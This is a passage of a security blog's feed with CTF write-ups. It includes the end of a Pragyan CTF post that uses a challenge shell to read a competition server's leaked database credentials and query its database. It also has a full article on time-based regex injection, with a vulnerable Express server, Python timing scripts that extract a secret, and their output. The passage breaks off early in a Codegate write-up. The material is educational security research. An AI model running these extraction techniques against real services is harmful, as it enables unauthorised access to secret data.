class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tests/&quot;</span>&gt;</span>tests/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">valign</span>=<span class="string">&quot;top&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/icons/folder.gif&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;[DIR]&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;writable/&quot;</span>&gt;</span>writable/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>2020-02-17 12:37  <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">align</span>=<span class="string">&quot;right&quot;</span>&gt;</span>  - <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span> <span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">&quot;5&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.29 (Ubuntu) Server at 172.26.0.1 Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Access to the internal folder was possible, of course, but when you crawl and open it in your browser, it looks like this:</p><p><img src="/img/2020/02/pragyan1.gif" alt="pragyan1"></p><p>The github page of the <code>melivora</code> engine can be found, and you can also get a hint from the date of modification, and the file <code>docker-compose.dev.yml</code> contains the credential information of CTF engine.</p><p>Below is the contents of the file <code>docker-compose.dev.yml</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">www-data@5841bda2da57:/code$ curl 172.26.0.1/mellivora/docker-compose.dev.yml</span><br><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:</span><br><span class="line">  mellivora:</span><br><span class="line">    image: mellivora</span><br><span class="line">    ports:</span><br><span class="line">      - 4000:80</span><br><span class="line">      - 4002:443</span><br><span class="line">    build:</span><br><span class="line">      context: .</span><br><span class="line">      dockerfile: Dockerfile</span><br><span class="line">    environment:</span><br><span class="line">      MELLIVORA_CONFIG_DB_ENGINE: mysql</span><br><span class="line">      MELLIVORA_CONFIG_DB_HOST: db</span><br><span class="line">      MELLIVORA_CONFIG_DB_PORT: 3306</span><br><span class="line">      MELLIVORA_CONFIG_DB_NAME: [redacted]</span><br><span class="line">      MELLIVORA_CONFIG_DB_USER: [redacted]</span><br><span class="line">      MELLIVORA_CONFIG_DB_PASSWORD: [redacted]</span><br><span class="line">    volumes:</span><br><span class="line">      - .:/var/www/mellivora</span><br><span class="line">      - composerdependencies:/var/www/mellivora/include/thirdparty/composer</span><br><span class="line">    links:</span><br><span class="line">      - db</span><br><span class="line">  db:</span><br><span class="line">    image: mysql:5.6</span><br><span class="line">    ports:</span><br><span class="line">      - 13306:3306</span><br><span class="line">    environment:</span><br><span class="line">      MYSQL_DATABASE: [redacted]</span><br><span class="line">      MYSQL_USER: [redacted]</span><br><span class="line">      MYSQL_PASSWORD: [redacted]</span><br><span class="line">      MYSQL_ROOT_PASSWORD: [redacted]</span><br><span class="line">    volumes:</span><br><span class="line">      - dbdata:/var/lib/mysql</span><br><span class="line">      - ./install/sql:/docker-entrypoint-initdb.d</span><br><span class="line">  adminer:</span><br><span class="line">      image: adminer</span><br><span class="line">      restart: always</span><br><span class="line">      ports:</span><br><span class="line">        - 15246:8080</span><br><span class="line">volumes:</span><br><span class="line">  composerdependencies:</span><br><span class="line">  dbdata:</span><br></pre></td></tr></table></figure><p>CTF service is provided through two containers, <code>mysql:5.6</code> and <code>melivora</code>, using <code>docker-compose</code> . And since database account credential has been leaked, so we can access to CTF database.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$con = new mysqli(&#x27;172.26.0.1&#x27;,&#x27;[redacted]&#x27;,&#x27;[redacted]&#x27;,&#x27;[redacted]&#x27;);</span><br><span class="line">$res = $con-&gt;query(&#x27;show databases&#x27;)-&gt;fetch_all();</span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure><p>Therefore, using the shell of a web challenge to execute php code in this way, all tables and columns(including user credential and flags) in the database could be leaked, and we can drop all databases since we have root privilege (I didn’t test this unnecessarily)</p><p><img src="/img/2020/02/image-20200223043626647.png" alt="image-20200223043626647"></p><p>In this case, it’s because of incredibly bad management.<br>basically, the web services are running on a docker, so there’s no need to install a web server that would be a directory traversal on the host, and to put the contents of the docker stuffs in the webroot.</p><p><img src="/img/2020/02/image-20200223044113588.png" alt="img"></p><p>I don’t know if it’s true, but there are rumors that the organizer of this CTF hasn’t paid the right amount of money for years. (If you know the truth, please leave a comment.)</p><p>Thank you for reading this post.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/2020/02/image-20200
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="Pragyan CTF" scheme="https://blog.p6.is/tags/Pragyan-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Time based Regex Injection</title>
    <link href="https://blog.p6.is/time-based-regex-injection/"/>
    <id>https://blog.p6.is/time-based-regex-injection/</id>
    <published>2020-02-14T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques">Revisiting ReDoS: A Rough Idea of Data Exfiltration by ReDoS and Side-channe Techniques</a></li></ul><p>The technique I will introduce this time is <code>Time based Regex Injection</code>.<br>This is a recently announced technique on February 5th.<br>Based on ReDOS vulnerability, This technique makes it possible to extract the full part of string to be compared.</p><p>The research and presentation above was based on Python.<br>I researched for a short period of time how it could be used on JavaScript.</p><h2 id="Regex-DOS"><a href="#Regex-DOS" class="headerlink" title="Regex DOS"></a>Regex DOS</h2><p><img src="https://blog.hackeriet.no/images/RegexNFA.png" alt="regex"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* blocks Event loop */</span></span><br><span class="line">/([a-z]+)+$/.<span class="title function_">exec</span>(<span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaa!&#x27;</span>);</span><br></pre></td></tr></table></figure><p>Traditional ReDOS vulnerabilities are thought to be to the point of ruining the nodejs event loop, which consists of single threads, making it difficult to affect services based on php or python or etc… that respond to requests by forking the process.</p><h2 id="Blind-injection"><a href="#Blind-injection" class="headerlink" title="Blind injection"></a>Blind injection</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;secretmessage&#x27;</span>.<span class="title function_">match</span>(<span class="string">&#x27;se(((((.+)+)+)+)+)!&#x27;</span>);</span><br><span class="line"><span class="comment">// 2.17s</span></span><br><span class="line"><span class="string">&#x27;secretmessage&#x27;</span>.<span class="title function_">match</span>(<span class="string">&#x27;sa(((((.+)+)+)+)+)!&#x27;</span>);</span><br><span class="line"><span class="comment">// 0.57s</span></span><br></pre></td></tr></table></figure><p>In The <strong>Time based Regex injection</strong>, By adjusting the delay time of the ReDOS to the appropriate level depending on the situation.<br>We can determine the contents of the string being compared through search time.</p><p>The result itself is similar to the <strong>Blind SQL Injection</strong>.</p><h2 id="methods-using-regex"><a href="#methods-using-regex" class="headerlink" title="methods using regex"></a>methods using regex</h2><p>The methods that use regular expressions as factors in <strong>JavaScript</strong> include the <code>exec</code> method and <code>test</code> method of <code>RegExp</code>, <code>match</code> method, <code>place</code> method and <code>split</code> method of <code>String</code>.</p><h2 id="forward-search"><a href="#forward-search" class="headerlink" title="forward search"></a>forward search</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)();</span><br><span class="line"><span class="keyword">const</span> secret = <span class="string">&#x27;THIS-IS-SECRET-DATA&#x27;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; answer &#125; = req.<span class="property">query</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">typeof</span> answer == <span class="string">&#x27;string&#x27;</span> &amp;&amp; !secret.<span class="title function_">search</span>(answer) &amp;&amp; secret === answer) &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(secret);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">end</span>(<span class="string">&#x27;Something Wrong :(&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        res.<span class="title function_">end</span>(<span class="string">&#x27;Something Wrong :O&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">80</span>);</span><br></pre></td></tr></table></figure><p>The above is a <strong>server script</strong> for testing.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    prefix = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">suffix = <span class="string">&#x27;(&#x27;</span> * depth + <span class="string">&#x27;.&#x27;</span> + <span class="string">&#x27;*)&#x27;</span> * depth + <span class="string">&#x27;!&#x27;</span></span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-&#x27;</span>:</span><br><span class="line">    begin = time()</span><br><span class="line">    requests.get(<span class="string">&#x27;http://localhost&#x27;</span>, params = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: prefix + c + suffix</span><br><span class="line">    &#125;);</span><br><span class="line">    r.append([c, time() - begin])</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">sorted</span>(r, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> r[::-<span class="number">1</span>][:<span class="number">3</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] &#123;&#125; : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>The above is the script to use for testing (<strong>forward search</strong>).</p><p>When It matches the navigation string, takes more time to distinguish the string.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">$ python forward.py 3</span><br><span class="line">[*] T : 11.411083698272705</span><br><span class="line">[*] H : 4.056897163391113</span><br><span class="line">[*] I : 1.1705141067504883</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;T&#x27;</span> 3</span><br><span class="line">[*] H : 3.7386693954467773</span><br><span class="line">[*] _ : 0.020990371704101562</span><br><span class="line">[*] B : 0.02016758918762207</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;TH&#x27;</span> 3</span><br><span class="line">[*] I : 1.3154821395874023</span><br><span class="line">[*] 8 : 0.008851051330566406</span><br><span class="line">[*] 6 : 0.007730245590209961</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THI&#x27;</span> 3</span><br><span class="line">[*] S : 0.3685579299926758</span><br><span class="line">[*] N : 0.014027118682861328</span><br><span class="line">[*] K : 0.012799263000488281</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS&#x27;</span> 3</span><br><span class="line">[*] - : 0.13479828834533691</span><br><span class="line">[*] M : 0.01068568229675293</span><br><span class="line">[*] _ : 0.004689693450927734</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-&#x27;</span> 3</span><br><span class="line">[*] I : 0.11702179908752441</span><br><span class="line">[*] N : 0.010607004165649414</span><br><span class="line">[*] J : 0.010245561599731445</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-I&#x27;</span> 3</span><br><span class="line">[*] S : 0.019062042236328125</span><br><span class="line">[*] 9 : 0.011596441268920898</span><br><span class="line">[*] - : 0.010843992233276367</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-I&#x27;</span> 4</span><br><span class="line">[*] S : 0.5390925407409668</span><br><span class="line">[*] P : 0.01799798011779785</span><br><span class="line">[*] K : 0.011503458023071289</span><br><span class="line"></span><br><span class="line">$ python forward.py <span class="string">&#x27;THIS-IS&#x27;</span> 4</span><br><span class="line">[*] - : 0.13084006309509277</span><br><span class="line">[*] C : 0.0070953369140625</span><br><span class="line">[*] I : 0.006118297576904297</span><br></pre></td></tr></table></figure><p>This is how you actually figure out a string through latency.</p><p>But there’s some limitation at this method.</p><table><thead><tr><th>Followed chars</th><th>Load</th><th>Delay time (seconds)</th></tr></thead><tbody><tr><td>1</td><td>-</td><td>-</td></tr><tr><td>2</td><td>-</td><td>-</td></tr><tr><td>3</td><td>220</td><td>1.30</td></tr><tr><td>4</td><td>77</td><td>1.21</td></tr><tr><td>5</td><td>38</td><td>1.55</td></tr><tr><td>6</td><td>22</td><td>1.10</td></tr><tr><td>7</td><td>15</td><td>1.20</td></tr><tr><td>8</td><td>11</td><td>1.21</td></tr><tr><td>9</td><td>9</td><td>1.86</td></tr><tr><td>10</td><td>7</td><td>1.11</td></tr><tr><td>11</td><td>6</td><td>1.55</td></tr><tr><td>12</td><td>5</td><td>1.09</td></tr><tr><td>13</td><td>5</td><td>5.56</td></tr><tr><td>14</td><td>4</td><td>1.19</td></tr><tr><td>15</td><td>4</td><td>4.53</td></tr><tr><td>16</td><td>4</td><td>19.02</td></tr><tr><td>17</td><td>3</td><td>0.61</td></tr><tr><td>18</td><td>3</td><td>1.86</td></tr><tr><td>19</td><td>3</td><td>5.23</td></tr></tbody></table><p>The above shows statistics on the relationship between these delays and the remaining characters.<br>This is greatly affected by the performance of your computer, so please take this as a simple reference.</p><p>The above regular expression was used to determine the value of the string to be compared.</p><p>However, if there is a limit to this method, if the remaining string is less than three characters, the length of the string required for navigation increases rapidly, and in real life the remaining three letters are less reliable because of the overhead or limiting input values.</p><p>Below is another form of regular expression to overcome these limitations.</p><h2 id="backward-search"><a href="#backward-search" class="headerlink" title="backward search"></a>backward search</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">prefix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">depth = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">3</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    prefix = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv) &gt;= <span class="number">2</span>:</span><br><span class="line">    depth = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">prefix2 = <span class="string">&#x27;(&#x27;</span> * depth</span><br><span class="line">suffix = <span class="string">&#x27;)*&#x27;</span> * depth</span><br><span class="line"></span><br><span class="line">r = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;_ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-&#x27;</span>:</span><br><span class="line">    begin = time()</span><br><span class="line">    requests.get(<span class="string">&#x27;http://localhost&#x27;</span>, params = &#123;</span><br><span class="line">        <span class="string">&#x27;answer&#x27;</span>: prefix + prefix2 + <span class="string">&#x27;[^&#123;&#125;]&#x27;</span>.<span class="built_in">format</span>(c) + suffix + <span class="string">&#x27;!&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line">    r.append([c, time() - begin])</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">sorted</span>(r, key = <span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> r[:<span class="number">5</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] &#123;&#125; : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(d[<span class="number">0</span>], d[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><p>You can use the previous information you found to determine whether the string on the back is included!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python backward.py <span class="string">&#x27;THIS-IS-SECRET-&#x27;</span> 40</span><br><span class="line">[*] A : 0.00428318977355957</span><br><span class="line">[*] T : 0.006232500076293945</span><br><span class="line">[*] D : 0.006254673004150391</span><br><span class="line">[*] 4 : 2.561211109161377</span><br><span class="line">[*] M : 2.5667755603790283</span><br></pre></td></tr></table></figure><p>The search shows that the remaining four characters are consist of <code>D T  A</code>.<br> After we get this information, we can create a combination of <code>4^4 (256)</code> for brute-force in the worst case.</p><table><thead><tr><th>Followed chars</th><th>Load</th><th>Delay time (seconds)</th></tr></thead><tbody><tr><td>1</td><td>785</td><td>1.38</td></tr><tr><td>2</td><td>224</td><td>0.53</td></tr><tr><td>3</td><td>80</td><td>1.36</td></tr><tr><td>4</td><td>38</td><td>1.39</td></tr><tr><td>5</td><td>22</td><td>1.58</td></tr><tr><td>6</td><td>15</td><td>1.33</td></tr><tr><td>7</td><td>11</td><td>1.34</td></tr><tr><td>8</td><td>9</td><td>2.04</td></tr><tr><td>9</td><td>7</td><td>1.42</td></tr><tr><td>10</td><td>6</td><td>1.75</td></tr><tr><td>11</td><td>5</td><td>1.17</td></tr><tr><td>12</td><td>5</td><td>5.55</td></tr><tr><td>13</td><td>4</td><td>1.20</td></tr><tr><td>14</td><td>4</td><td>4.63</td></tr><tr><td>15</td><td>4</td><td>19.9</td></tr><tr><td>16</td><td>3</td><td>0.65</td></tr><tr><td>17</td><td>3</td><td>1.86</td></tr><tr><td>18</td><td>3</td><td>5.68</td></tr><tr><td>19</td><td>3</td><td>17.4</td></tr></tbody></table><p>The above shows statistics on the relationship between delay time and the remaining characters in the rear navigation.<br>Likewise, the performance of your computer is greatly affected, so please take this as a simple reference.</p><h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>This is a quite general technique.<br>And maybe It would be a good choice to analyze how to affect using this in the various libraries.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques">https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques</a></li><li><a href="https://blog.hackeriet.no/regex-dos-in-java-layer/">https://blog.hackeriet.no/regex-dos-in-java-layer/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-technique
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="javascript" scheme="https://blog.p6.is/tags/javascript/"/>
    
      <category term="regex dos" scheme="https://blog.p6.is/tags/regex-dos/"/>
    
      <category term="regex injection" scheme="https://blog.p6.is/tags/regex-injection/"/>
    
  </entry>
  
  <entry>
    <title>Codegate CTF 2020 Preliminary</title>
    <link href="https://blog.p6.is/codegate-ctf-2020-preliminary/"/>
    <id>https://blog.p6.is/codegate-ctf-2020-preliminary/</id>
    <published>2020-02-09T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<ul><li><a href="http://https//ctftime.org/event/938">https://ctftime.org/event/938</a></li></ul><p><strong>Codegate CTF</strong> is one of the major competitions in Korea.<br>I played on the university student department as <strong>p015x</strong> and ranked <strong>10th</strong>. </p><p><img src="/img/2020/02/%EC%BA%A1%EC%B2%98.gif" alt="img"></p><h2 id="702pts-CSP"><a href="#702pts-CSP" class="headerlink" title="[702pts] CSP"></a>[702pts] <a href="#csp">CSP</a></h2><ul><li><a href="https://file.rwx.kr/ctf/2020/codegate/49770130529af987fff9fb71b97a0abe.zip">49770130529af987fff9fb71b97a0abe.zip</a></li></ul><blockquote><p>Description :<br>I made an simple echo service for my API practice. If you find bug, please tell me!<br><a href="http://110.10.147.166/">http://110.10.147.166/</a> </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;q&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;sig&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$api_string</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;q&quot;</span>]);</span><br><span class="line"><span class="variable">$sig</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sig&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$api_string</span>) !== <span class="variable">$sig</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;??&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//APIs Format : name(b64),p1(b64),p2(b64)|name(b64),p1(b64),p2(b64) ...</span></span><br><span class="line"><span class="variable">$apis</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span 